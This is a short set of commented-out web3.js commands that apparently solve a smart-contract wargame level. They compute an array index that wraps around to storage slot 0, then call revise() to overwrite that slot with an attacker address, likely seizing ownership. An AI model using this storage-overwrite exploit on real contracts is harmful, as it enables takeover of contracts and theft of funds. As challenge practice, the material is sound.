
// // calculate storage address of array using the hash of the slot number 
// // of the storage length value
// web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')
// let a = web3.utils.toBN("0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6")

// let b = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
// // calculate the address of the first variable of the contract
// let c = b.sub(a).add(web3.utils.toBN(1))
// web3.utils.numberToHex(c)

// // change the variable by using c as an array index, so messed up
// await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", 
//                     "0x00000000000000000000000087Fa1091e58bA7D993F63Bb31f6CB08305eCD4e2")